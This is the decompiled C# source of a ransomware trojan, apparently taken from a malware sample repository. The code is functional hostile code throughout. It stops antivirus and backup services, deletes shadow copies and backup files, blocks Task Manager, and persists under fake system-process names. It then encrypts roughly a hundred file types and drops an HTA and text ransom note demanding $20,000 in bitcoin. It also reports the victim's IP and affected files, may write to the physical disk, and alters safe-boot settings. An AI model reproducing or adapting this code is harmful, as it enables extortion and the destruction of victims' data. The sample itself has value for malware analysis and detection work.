// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.IyUWqQZlcOSTLhq
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using lowFQsJSlrFgr;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MufMaOSvGyvz
{
  internal class IyUWqQZlcOSTLhq
  {
    public static string xQMkqhCYTvWMq = "EVET";
    public static byte[] ctSkisxFbkPzS = (byte[]) null;
    public static string FFbMRUzulqEpb = "NO";
    public static string HJhinhnlOMNxIX = "100000000";
    public static List<string> siKfLgBTOtPOl = new List<string>();
    public static List<string> hkQMoFyHzQ = new List<string>();
    public static string JNHKDqKmSycXVyA = "NO";
    public static string KRFQhWmJuhVexr = "";
    public static string SMVGmorJMiSRUva = "NO";
    public static int hXaNTqTbRnpr = 0;
    public static string zKSeEXflLrlh = "NO";
    public static string LDNdJBbfsdAY = "NO";
    public static string kqxgiwAmxJZAF = "NO";
    public static string efojwxvnMIbXXP = "0";
    public static string IUvwjPVcqFrE = "YES";
    public static string QDIBAwivbzugjctV = "NO";
    public static string PVCmRrdzBeoM = "NO";
    public static string IBSndtoMdgy = "NO";
    public static List<string> wiZlVeXAvqcJt = new List<string>()
    {
      "lsass.exe",
      "svchst.exe",
      "crcss.exe",
      "chrome32.exe",
      "firefox.exe",
      "calc.exe",
      "mysqld.exe",
      "dllhst.exe",
      "opera32.exe",
      "memop.exe",
      "spoolcv.exe",
      "ctfmom.exe",
      "SkypeApp.exe"
    };
    public static List<string> CSiGcEXgTf = new List<string>();
    public static string ELyYGppfySYfq = "YES";
    public static string udJVdpbosFv = "NO";
    public static string nEFvYMIALr = "NO";
    public static List<string> CfvwdOobMuXeStMb = new List<string>();
    public static string YkwRnYlFytdkH = "NO";
    private static string YQBusMLxsiehe = "3747bdbf-0ef0-42d8-9234-70d68801f407";
    public static string FsmxXwwVyXze = "YES";
    public static string OZagXxYpUbG = "NO";
    public static List<string> ypieyuCOltLWYFl = new List<string>()
    {
      "stop avpsus /y",
      "stop McAfeeDLPAgentService /y",
      "stop mfewc /y",
      "stop BMR Boot Service /y",
      "stop NetBackup BMR MTFTP Service /y",
      "stop DefWatch /y",
      "stop ccEvtMgr /y",
      "stop ccSetMgr /y",
      "stop SavRoam /y",
      "stop RTVscan /y",
      "stop QBFCService /y",
      "stop QBIDPService /y",
      "stop Intuit.QuickBooks.FCS /y",
      "stop QBCFMonitorService /y",
      "stop YooBackup /y",
      "stop YooIT /y",
      "stop zhudongfangyu /y",
      "stop stc_raw_agent /y",
      "stop VSNAPVSS /y",
      "stop VeeamTransportSvc /y",
      "stop VeeamDeploymentService /y",
      "stop VeeamNFSSvc /y",
      "stop veeam /y",
      "stop PDVFSService /y",
      "stop BackupExecVSSProvider /y",
      "stop BackupExecAgentAccelerator /y",
      "stop BackupExecAgentBrowser /y",
      "stop BackupExecDiveciMediaService /y",
      "stop BackupExecJobEngine /y",
      "stop BackupExecManagementService /y",
      "stop BackupExecRPCService /y",
      "stop AcrSch2Svc /y",
      "stop AcronisAgent /y",
      "stop CASAD2DWebSvc /y",
      "stop CAARCUpdateSvc /y",
      "stop sophos /y"
    };
    public static List<string> YDWHvbVPBJ = new List<string>()
    {
      "config SQLTELEMETRY start= disabled",
      "config SQLTELEMETRY$ECWDB2 start= disabled",
      "config SQLWriter start= disabled",
      "config SstpSvc start= disabled"
    };
    public static List<string> AgdpzRigFOYhsqvH = new List<string>()
    {
      "/IM mspub.exe /F",
      "/IM mydesktopqos.exe /F",
      "/IM mydesktopservice.exe /F"
    };
    public static List<string> WRakAWHNtJErZ = new List<string>()
    {
      "Delete Shadows /all /quiet",
      "resize shadowstorage /for=c: /on=c: /maxsize=401MB",
      "resize shadowstorage /for=c: /on=c: /maxsize=unbounded",
      "resize shadowstorage /for=d: /on=d: /maxsize=401MB",
      "resize shadowstorage /for=d: /on=d: /maxsize=unbounded",
      "resize shadowstorage /for=e: /on=e: /maxsize=401MB",
      "resize shadowstorage /for=e: /on=e: /maxsize=unbounded",
      "resize shadowstorage /for=f: /on=f: /maxsize=401MB",
      "resize shadowstorage /for=f: /on=f: /maxsize=unbounded",
      "resize shadowstorage /for=g: /on=g: /maxsize=401MB",
      "resize shadowstorage /for=g: /on=g: /maxsize=unbounded",
      "resize shadowstorage /for=h: /on=h: /maxsize=401MB",
      "resize shadowstorage /for=h: /on=h: /maxsize=unbounded",
      "Delete Shadows /all /quiet"
    };
    public static List<string> PMQqUDKVTQJ = new List<string>()
    {
      "/s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk",
      "/s /f /q d:\\*.VHD d:\\*.bac d:\\*.bak d:\\*.wbcat d:\\*.bkf d:\\Backup*.* d:\\backup*.* d:\\*.set d:\\*.win d:\\*.dsk",
      "/s /f /q e:\\*.VHD e:\\*.bac e:\\*.bak e:\\*.wbcat e:\\*.bkf e:\\Backup*.* e:\\backup*.* e:\\*.set e:\\*.win e:\\*.dsk",
      "/s /f /q f:\\*.VHD f:\\*.bac f:\\*.bak f:\\*.wbcat f:\\*.bkf f:\\Backup*.* f:\\backup*.* f:\\*.set f:\\*.win f:\\*.dsk",
      "/s /f /q g:\\*.VHD g:\\*.bac g:\\*.bak g:\\*.wbcat g:\\*.bkf g:\\Backup*.* g:\\backup*.* g:\\*.set g:\\*.win g:\\*.dsk",
      "/s /f /q h:\\*.VHD h:\\*.bac h:\\*.bak h:\\*.wbcat h:\\*.bkf h:\\Backup*.* h:\\backup*.* h:\\*.set h:\\*.win h:\\*.dsk"
    };
    public static string lMBJRPlmLoPIJX = "NO";
    public static string zHSVICJAOa = "NO";
    internal static DateTime OOZMRHMVMrmD = new DateTime(2000, 1, 1);
    internal static DateTime LViAigNUQAbNhB = new DateTime(2100, 1, 1);
    public static string fCiJsjNmDGYo = "YES";
    public static string tsQtKfDKZIMNuO = "10";
    public static string VgdNVBEBhpUPO = "NO";
    public static string rwJLUnGaYuk = "NO";
    public static string JntTsbLDjfdWrF = "NO";
    public static string WgQvAOsxNeWD = "YES";
    public static string qqibCzLAGVg = "NO";
    public static string uySjNlajuEE = "NO";
    public static List<string> ulDHvcBRgNNLZtzS = new List<string>()
    {
      "docx",
      "pdf",
      "xlsx",
      "csv"
    };
    public static string BtOESQEmmPY = "NO";
    public static string uOyyfFtzedTPufn = "1";
    public static string mlQgpavlrIuX = "YES";
    public static string oiSsXsWUMOtEp = "NO";
    public static string KkZoOVzwQPf = "NO";
    public static string idAGkbKivQU = string.Empty;
    public static string gremWWHIcFVT = "NO";
    public static string ldDdAgsFLTkAX = "YES";
    public static string ZPHPKQDuPKi = "YES";
    public static string rqOtfqTYGrTie = "SW5mb3JtYXRpb24uLi4=";
    public static string wrCDlMOHoXr = "WW91ciBGaWxlcyBhcmUgRW5jcnlwdGVkLg0KDQpEb27igJl0IHdvcnJ5LCB5b3UgY2FuIHJldHVybiBhbGwgeW91ciBmaWxlcyENCg0KWW91J3ZlIGdvdCA0OCBob3VycygyIERheXMpLCBiZWZvcmUgeW91IGxvc3QgeW91ciBmaWxlcyBmb3JldmVyLg0KSSB3aWxsIHRyZWF0IHlvdSBnb29kIGlmIHlvdSB0cmVhdCBtZSBnb29kIHRvby4NCg0KVGhlIFByaWNlIHRvIGdldCBhbGwgdGhpbmdzIHRvIHRoZSBub3JtYWwgOiAyMCwwMDAkDQpNeSBCVEMgV2FsbGV0IElEIDoNCjFGNnNxOFl2ZnRUZnVFNFFjWXhmSzhzNVhGVVVIQzdzRDkNCg0KQ29udGFjdCA6DQpqb3NlcGhudWxsQHNlY21haWwucHJvDQo=";
    public static string rtiZKDwSQcOQoyu = "NO";
    public static string aWdGZORAeYAJ = "NO";
    public static string oCUqHyphdF = "NO";
    public static string VneWBiDudYbxfV = "NO";
    public static string nrUdlkCMdxZ = "YES";
    public static string oarFYicwLcOiB = "LOGONISOFF";
    public static string wEFLZtRchlX = "YES";
    public static string WnYspfSeqpPPh = "NO";
    public static string KYDuKlMFWLOzqeDUz = "mystartup.lnk";
    public static string XKCeykQXWEYgem = "NO";
    public static string OZfhJywPQSn = "NO";
    public static string JGjnyMyTennfuufcT = "YES";
    public static string ylIKJJsgdllsSVj = "YES";
    public static string LcFYzbWwUuFdZ = "VGhhbm9z";
    public static string gcOHYvBogGyw = "YES";
    public static string amSYDuIqjtb = "NO";

    private static void Main(string[] args)
    {
      try
      {
        MPimnsOrmpnAX.IjTKmPwIgCf(IyUWqQZlcOSTLhq.YQBusMLxsiehe);
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (IyUWqQZlcOSTLhq.gcOHYvBogGyw == "YES")
          new Thread(new ThreadStart(hpvgypLXixi.YfdgCPKijzed))
          {
            Priority = ThreadPriority.Lowest,
            IsBackground = true
          }.Start();
      }
      catch
      {
      }
      if (IyUWqQZlcOSTLhq.kqxgiwAmxJZAF == "YES")
        Thread.Sleep(int.Parse(IyUWqQZlcOSTLhq.efojwxvnMIbXXP));
      try
      {
        if (IyUWqQZlcOSTLhq.wEFLZtRchlX == "YES")
        {
          string str = jMDFRLEyorejfI.vgwIjtaVyLLgbVk();
          if ((str.Contains("Windows 10") ? 1 : (str.Contains("Windows 8") ? 1 : 0)) == 0)
            jMDFRLEyorejfI.CFPjirxGMKMKPt();
        }
      }
      catch (Exception ex)
      {
      }
      if (IyUWqQZlcOSTLhq.mlQgpavlrIuX == "YES")
      {
        try
        {
          if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            new Thread(new ThreadStart(new IyUWqQZlcOSTLhq.qnaQFtvgrosG()
            {
              qbsdORlwvxu = new string[4]
              {
                "Taskmgr",
                "taskmgr",
                "ProcessHacker",
                "procexp"
              }
            }.\u003CMain\u003Eb__5))
            {
              IsBackground = true
            }.Start();
        }
        catch
        {
        }
        try
        {
          qMyHPNTWke.CusTKXtiVMDCm("taskmgr");
        }
        catch
        {
        }
        try
        {
          qMyHPNTWke.CusTKXtiVMDCm("procexp");
        }
        catch
        {
        }
        try
        {
          qMyHPNTWke.CusTKXtiVMDCm("procexp64");
        }
        catch
        {
        }
        try
        {
          qMyHPNTWke.CusTKXtiVMDCm("ProcessHacker");
        }
        catch
        {
        }
        new Thread(new ThreadStart(FAripJTXHNalmT.QvJxjZHBdlZUQ))
        {
          IsBackground = true
        }.Start();
      }
      if ((!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? 1 : (!(IyUWqQZlcOSTLhq.qqibCzLAGVg == "YES") ? 1 : 0)) == 0)
      {
        try
        {
          IyUWqQZlcOSTLhq.TQpGafavBJI("Set-MpPreference -EnableControlledFolderAccess Disabled");
        }
        catch
        {
        }
      }
      if (IyUWqQZlcOSTLhq.IUvwjPVcqFrE == "YES")
        QLRuRgFESyg.PXPqDNdvjDrC();
      if ((!(IyUWqQZlcOSTLhq.PVCmRrdzBeoM == "YES") ? 1 : (xxKHdLdCMeOG.DfTRTAsuFViXE() ? 1 : 0)) == 0)
        xxKHdLdCMeOG.bfVvoFmZrqIvYF();
      if ((!(IyUWqQZlcOSTLhq.udJVdpbosFv == "YES") ? 1 : (!xxKHdLdCMeOG.DfTRTAsuFViXE() ? 1 : 0)) == 0)
      {
        new tOQtIRDNrGpD().ywIDKStthl(false);
        new tOQtIRDNrGpD().jkSoOuByvlwrEF();
      }
      if (IyUWqQZlcOSTLhq.LDNdJBbfsdAY == "YES")
        ghEykQIAJr.aiPqAgDxThSDE();
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      string fileName = mainModule.FileName;
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
      string str2 = str1 + Path.GetFileName(fileName);
      if ((!(IyUWqQZlcOSTLhq.SMVGmorJMiSRUva == "YES") ? 1 : (!(fileName != str2) ? 1 : 0)) == 0)
        new Thread(new ThreadStart(IyUWqQZlcOSTLhq.zstTHeVErMkJUU))
        {
          IsBackground = true,
          Priority = ThreadPriority.Highest
        }.Start();
      if ((!(IyUWqQZlcOSTLhq.JNHKDqKmSycXVyA == "YES") ? 1 : (mainModule == null ? 1 : 0)) == 0)
      {
        if (fileName != str2)
        {
          try
          {
            IyUWqQZlcOSTLhq.hXaNTqTbRnpr = IyUWqQZlcOSTLhq.DPxcFgWfJlePTF(0, IyUWqQZlcOSTLhq.wiZlVeXAvqcJt.Count);
            System.IO.File.Copy(fileName, str1 + IyUWqQZlcOSTLhq.wiZlVeXAvqcJt[IyUWqQZlcOSTLhq.hXaNTqTbRnpr], true);
            Process.Start(str1 + IyUWqQZlcOSTLhq.wiZlVeXAvqcJt[IyUWqQZlcOSTLhq.hXaNTqTbRnpr]);
            IyUWqQZlcOSTLhq.obllpHNmyTXvR();
            Process.GetCurrentProcess().Kill();
          }
          catch (Exception ex)
          {
          }
        }
      }
      try
      {
        if ((!(IyUWqQZlcOSTLhq.lMBJRPlmLoPIJX == "YES") ? 1 : (!(DateTime.Now < IyUWqQZlcOSTLhq.OOZMRHMVMrmD) ? 1 : 0)) == 0)
          return;
      }
      catch
      {
      }
      try
      {
        if ((!(IyUWqQZlcOSTLhq.zHSVICJAOa == "YES") ? 1 : (!(DateTime.Now > IyUWqQZlcOSTLhq.LViAigNUQAbNhB) ? 1 : 0)) == 0)
          IyUWqQZlcOSTLhq.obllpHNmyTXvR();
      }
      catch
      {
      }
      foreach (string wxrufMgRtpdSU in IyUWqQZlcOSTLhq.ypieyuCOltLWYFl)
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("net.exe", wxrufMgRtpdSU);
      foreach (string wxrufMgRtpdSU in IyUWqQZlcOSTLhq.YDWHvbVPBJ)
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("sc.exe", wxrufMgRtpdSU);
      foreach (string wxrufMgRtpdSU in IyUWqQZlcOSTLhq.AgdpzRigFOYhsqvH)
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("taskkill.exe", wxrufMgRtpdSU);
      foreach (string wxrufMgRtpdSU in IyUWqQZlcOSTLhq.WRakAWHNtJErZ)
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("vssadmin.exe", wxrufMgRtpdSU);
      foreach (string wxrufMgRtpdSU in IyUWqQZlcOSTLhq.PMQqUDKVTQJ)
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("del.exe", wxrufMgRtpdSU);
      if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("cmd.exe", "/c rd /s /q %SYSTEMDRIVE%\\$Recycle.bin");
      if ((!(IyUWqQZlcOSTLhq.ELyYGppfySYfq == "YES") || !IyUWqQZlcOSTLhq.LEYLEJpRfEgTMCc() ? 1 : (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? 1 : 0)) == 0)
        new Thread(new ThreadStart(IxJlmmAtIYbweZ.DtsYjXXFKl))
        {
          IsBackground = true
        }.Start();
      if (IyUWqQZlcOSTLhq.OZagXxYpUbG == "YES")
        ;
      IyUWqQZlcOSTLhq.KRFQhWmJuhVexr = !(IyUWqQZlcOSTLhq.VgdNVBEBhpUPO == "NO") ? "LD2WALLJZR93XK10KS892LMU006ZXO3Q" : EOjDcEpeLmEa.BkigirNyAye(32);
      string str3 = KcMVbmuWfLLu.QKUAgIgehqhgaII(IyUWqQZlcOSTLhq.KRFQhWmJuhVexr);
      if (IyUWqQZlcOSTLhq.ldDdAgsFLTkAX == "YES")
        IyUWqQZlcOSTLhq.glLILXcrbW();
      PDPmvqgvIguXKGS.BPwwjcgjbB(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), IyUWqQZlcOSTLhq.KYDuKlMFWLOzqeDUz), "C:\\Users\\user\\AppData\\Local\\Temp\\\\HOW_TO_DECYPHER_FILES.txt", (string) null, (string) null, "Installer...", "Ctrl+Shift+X", (string) null);
      try
      {
        IyUWqQZlcOSTLhq.QvJELJzMCQJDDH(new string[1]
        {
          "[auto]"
        }, new string[101]
        {
          "dat",
          "txt",
          "jpeg",
          "gif",
          "jpg",
          "png",
          "php",
          "cs",
          "cpp",
          "rar",
          "zip",
          "html",
          "htm",
          "xlsx",
          "xls",
          "avi",
          "mp4",
          "ppt",
          "doc",
          "docx",
          "sxi",
          "sxw",
          "odt",
          "hwp",
          "tar",
          "bz2",
          "mkv",
          "eml",
          "msg",
          "ost",
          "pst",
          "edb",
          "sql",
          "accdb",
          "mdb",
          "dbf",
          "odb",
          "myd",
          "php",
          "java",
          "cpp",
          "pas",
          "asm",
          "key",
          "pfx",
          "pem",
          "p12",
          "csr",
          "gpg",
          "aes",
          "vsd",
          "odg",
          "raw",
          "nef",
          "svg",
          "psd",
          "vmx",
          "vmdk",
          "vdi",
          "lay6",
          "sqlite3",
          "sqlitedb",
          "accdb",
          "java",
          "class",
          "mpeg",
          "djvu",
          "tiff",
          "backup",
          "pdf",
          "cert",
          "docm",
          "xlsm",
          "dwg",
          "bak",
          "qbw",
          "nd",
          "tlg",
          "lgb",
          "pptx",
          "mov",
          "xdw",
          "ods",
          "wav",
          "mp3",
          "aiff",
          "flac",
          "m4a",
          "csv",
          "sql",
          "ora",
          "mdf",
          "ldf",
          "ndf",
          "dtsx",
          "rdl",
          "dim",
          "mrimg",
          "qbb",
          "rtf",
          "7z"
        }, new string[0], IyUWqQZlcOSTLhq.KRFQhWmJuhVexr, ".crypted");
      }
      catch
      {
      }
      IyUWqQZlcOSTLhq.KRFQhWmJuhVexr = EOjDcEpeLmEa.BkigirNyAye(32);
      if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
      {
        using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
        {
          streamWriter.WriteLine("Your files were safely cyphered.\r\n\r\nContact: my-contact-email@protonmail.com");
          streamWriter.WriteLine("\r\n");
          streamWriter.WriteLine("Key Identifier: ");
          streamWriter.WriteLine(str3);
          if (IyUWqQZlcOSTLhq.FsmxXwwVyXze == "NO")
          {
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine("Number of files that were processed is: " + Convert.ToString(IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Count));
          }
        }
      }
      else
        System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + str3);
      foreach (string str4 in IyUWqQZlcOSTLhq.CSiGcEXgTf)
      {
        if (!(str4 == Environment.GetFolderPath(Environment.SpecialFolder.Desktop)))
        {
          try
          {
            if (!System.IO.File.Exists(str4 + "\\HOW_TO_DECYPHER_FILES.txt"))
              System.IO.File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt", str4 + "\\HOW_TO_DECYPHER_FILES.txt", true);
            else
              System.IO.File.AppendAllText(str4 + "\\HOW_TO_DECYPHER_FILES.txt", "\r\nAditional KeyId:\r\n" + str3);
          }
          catch (Exception ex)
          {
          }
        }
      }
      if (IyUWqQZlcOSTLhq.JGjnyMyTennfuufcT == "YES")
      {
        if (!System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
        {
          using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
          {
            streamWriter.WriteLine("<html>\n<body style=\"background-color: black;\">\n<p style=\"text-align: center; background-color: black;\"><span style=\"color: #ff0000; background-color: black;\"><span style=\"background-color: #000000;\"><span style=\"background-color: #ff0000;\"><img src=\"https://cutewallpaper.org/21/skull-wallpaper-free/Skull-Wallpaper-3D-Wallpapers-Latest.jpg\" alt=\"\" width=\"650\" height=\"403\" /></span></span></span></p>\n\n<h2 style=\"text-align: center; color:red;\">\nYour Files are Encrypted.</h2><br>\n<p style=\"text-align: center; color:red; font-weight: bold;\">\nDon’t worry, you can return all your files!<br>\nI don't want to loose your files too. if i want to do something bad to you i would've wipe all of your network but that's not helping me. :)<br>\nso temporary all of your files is mine now until you pay the price of them.<br>\nIf you want to restore them contact me from the address below, i'll be happy to help you to get out of this situation.<br>\nYou've got 48 hours(2 Days), before you lost your files forever.<br>\nI will treat you good if you treat me good too.\n\n\n</p>\n<h3 style=\"color:yellow; text-align: center;\">The Price to get all things to the normal : 20,000$</h3>\n<h3 style=\"color:yellow; text-align: center;\"> My BTC Wallet ID : <p style=\"text-align: center; color:red;\">1F6sq8YvftTfuE4QcYxfK8s5XFUUHC7sD9</p> </h3> \n<h3 style=\"color:yellow; text-align: center;\">Contact : <br> josephnull@secmail.pro </h3>\n\n<h2 style=\"text-align: center; color:red;\">Contact: josephnull@secmail.pro </h2>\n</body>\n</html>");
            streamWriter.WriteLine("\r\n");
            streamWriter.WriteLine("<p style=\"text-align: center;\">Key Identifier: ");
            streamWriter.WriteLine(str3 + "</p>");
            if (IyUWqQZlcOSTLhq.FsmxXwwVyXze == "NO")
            {
              streamWriter.WriteLine("\r\n");
              streamWriter.WriteLine("<p style=\"text-align: center;\">" + "Number of files that were processed is: " + Convert.ToString(IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Count) + "</p>");
            }
          }
        }
        else
          System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta", "<p style=\"text-align: center;\">" + "\r\nAditional KeyId:\r\n" + str3 + "</p>");
      }
      if (IyUWqQZlcOSTLhq.YkwRnYlFytdkH == "YES")
      {
        try
        {
          if (IyUWqQZlcOSTLhq.FsmxXwwVyXze == "NO")
            MfnxCHhUwIjyzc.qkCGSsikzw(KYfRRhHmvJaq: ("Client IP:  " + new WebClient().DownloadString("http://icanhazip.com") + "Date of encryption: " + new DateTime().Date.ToString() + "\r\n" + "Number of files encrypted: " + Convert.ToString(IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb.Count) + "\r\n" + "Possible affected files: " + "\r\n" + Convert.ToString((object) IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb) + "\r\n" + "Client Unique Identifier Key: " + str3));
          else
            MfnxCHhUwIjyzc.qkCGSsikzw(KYfRRhHmvJaq: ("Client IP:  " + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + "Date of encryption: " + new DateTime().Date.ToString() + "\r\n" + "Possible affected files: " + "\r\n" + Convert.ToString((object) IyUWqQZlcOSTLhq.CfvwdOobMuXeStMb) + "\r\n" + "Client Unique Identifier Key: " + str3));
        }
        catch
        {
        }
      }
      if (IyUWqQZlcOSTLhq.IBSndtoMdgy == "YES")
      {
        try
        {
          biNPKopUkiSJuO.UnNeRUofkpwgP(new Uri(""));
        }
        catch
        {
        }
      }
      if (IyUWqQZlcOSTLhq.JGjnyMyTennfuufcT == "NO")
      {
        if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt"))
          Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.txt");
      }
      else if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta"))
        Process.Start("mshta.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW_TO_DECYPHER_FILES.hta");
      if (IyUWqQZlcOSTLhq.ldDdAgsFLTkAX == "YES")
      {
        if ((!(IyUWqQZlcOSTLhq.ZPHPKQDuPKi == "YES") || string.IsNullOrEmpty(IyUWqQZlcOSTLhq.rqOtfqTYGrTie) ? 1 : (string.IsNullOrEmpty(IyUWqQZlcOSTLhq.wrCDlMOHoXr) ? 1 : 0)) == 0)
          IyUWqQZlcOSTLhq.BvfGoSdlqjPP(IyUWqQZlcOSTLhq.rqOtfqTYGrTie, IyUWqQZlcOSTLhq.wrCDlMOHoXr);
        else
          IyUWqQZlcOSTLhq.BvfGoSdlqjPP();
      }
      if (IyUWqQZlcOSTLhq.oarFYicwLcOiB != "LOGONISOFF")
        IyUWqQZlcOSTLhq.TQsIfIHUHFwOo(IyUWqQZlcOSTLhq.oarFYicwLcOiB);
      if (!string.IsNullOrEmpty(IyUWqQZlcOSTLhq.idAGkbKivQU))
      {
        try
        {
          System.IO.File.Delete(IyUWqQZlcOSTLhq.idAGkbKivQU);
        }
        catch
        {
        }
      }
      if ((!(IyUWqQZlcOSTLhq.nrUdlkCMdxZ == "YES") ? 1 : (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? 1 : 0)) == 0)
      {
        try
        {
          string str5 = IyUWqQZlcOSTLhq.XfZBgoPdPvsMCS();
          if ((str5.Contains("Windows 10") ? 1 : (str5.Contains("Windows 8") ? 1 : 0)) == 0)
            ILwfcQVhzflf.hvKwMSNYgA("\\\\.\\PhysicalDrive0");
        }
        catch
        {
        }
      }
      if (jMDFRLEyorejfI.tTkvXnIXBUwQ())
        IyUWqQZlcOSTLhq.tbluQOozLSqDhFc("bcdedit.exe", "/deletevalue {default} safeboot");
      if (!(IyUWqQZlcOSTLhq.xQMkqhCYTvWMq == "EVET"))
        return;
      IyUWqQZlcOSTLhq.obllpHNmyTXvR();
    }

    public static void zstTHeVErMkJUU()
    {
      int num = (int) MessageBox.Show("This program requires Microsoft .NET Framework v. 4.82 or superior to run properly", "Atention!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }

    private static int DPxcFgWfJlePTF(int int_0, int int_1)
    {
      RNGCryptoServiceProvider cryptoServiceProvider = new RNGCryptoServiceProvider();
      byte[] data = new byte[4];
      cryptoServiceProvider.GetBytes(data);
      return new Random(BitConverter.ToInt32(data, 0)).Next(int_0, int_1);
    }

    public static List<string> tsTJYQCcBKUvsb(
      string string_0,
      string[] string_1,
      string string_2,
      string[] string_3,
      string string_4)
    {
      List<string> list_0 = new List<string>();
      Stack<string> stringStack = new Stack<string>(20);
      stringStack.Push(string_0);
      while (stringStack.Count > 0)
      {
        string path = stringStack.Pop();
        string[] directories;
        try
        {
          directories = Directory.GetDirectories(path);
        }
        catch
        {
          continue;
        }
        string[] files;
        try
        {
          if ((path.ToLower().Contains("program files") || path.ToLower().Contains("windows") || path.ToLower().Contains("perflogs") || path.ToLower().Contains("internet explorer") || path.ToLower().Contains("programdata") ? 0 : (!path.ToLower().Contains("appdata") ? 1 : 0)) != 0)
            files = Directory.GetFiles(path);
          else
            continue;
        }
        catch
        {
          continue;
        }
        foreach (string fileName in files)
        {
          try
          {
            FileInfo fileInfo = new FileInfo(fileName);
            if ((fileInfo.FullName.Contains("autoexec.bat") || fileInfo.FullName.Contains("desktop.ini") || fileInfo.FullName.Contains("autorun.inf") || fileInfo.FullName.Contains("ntuser.dat") || fileInfo.FullName.Contains("iconcache.db") || fileInfo.FullName.Contains("bootsect.bak") || fileInfo.FullName.Contains("boot.ini") || fileInfo.FullName.Contains("ntuser.dat.log") || fileInfo.FullName.Contains("thumbs.db") || fileInfo.FullName.ToLower().Contains("bootmgr") || fileInfo.FullName.ToLower().Contains("pagefile.sys") || fileInfo.FullName.ToLower().Contains("config.sys") || fileInfo.FullName.ToLower().Contains("ntuser.ini") || fileInfo.FullName.Contains("Builder_Log") || fileInfo.FullName.Contains("RSAKeys") || fileInfo.FullName.Contains("HOW_TO_DECYPHER_FILES") || fileInfo.FullName.EndsWith(".crypted") || fileInfo.FullName.EndsWith("exe") || fileInfo.FullName.EndsWith("dll") || fileInfo.FullName.EndsWith("EXE") || fileInfo.FullName.EndsWith("DLL") || fileInfo.FullName.Contains("Recycle.Bin") ? 0 : (!fileInfo.FullName.Contains(IyUWqQZlcOSTLhq.KYDuKlMFWLOzqeDUz) ? 1 : 0)) != 0)
            {
              if ((!System.IO.File.Exists(fileInfo.FullName) || (double) fileInfo.Length > double.Parse(IyUWqQZlcOSTLhq.HJhinhnlOMNxIX) * 1024.0 * 1024.0 ? 1 : (!(IyUWqQZlcOSTLhq.FFbMRUzulqEpb == "YES") ? 1 : 0)) == 0)
              {
                list_0.Add(fileInfo.FullName);
                IyUWqQZlcOSTLhq.GXekGISbFWfkZ(list_0, string_1, string_2, string_3, string_4);
                list_0.Clear();
              }
              else if ((!System.IO.File.Exists(fileInfo.FullName) ? 1 : (!(IyUWqQZlcOSTLhq.FFbMRUzulqEpb == "NO") ? 1 : 0)) == 0)
              {
                list_0.Add(fileInfo.FullName);
                IyUWqQZlcOSTLhq.GXekGISbFWfkZ(list_0, string_1, string_2, string_3, string_4);
                list_0.Clear();
              }
            }
          }
          catch
          {
          }
        }
        foreach (string str in directories)
          stringStack.Push(str);
      }
      return list_0;
    }

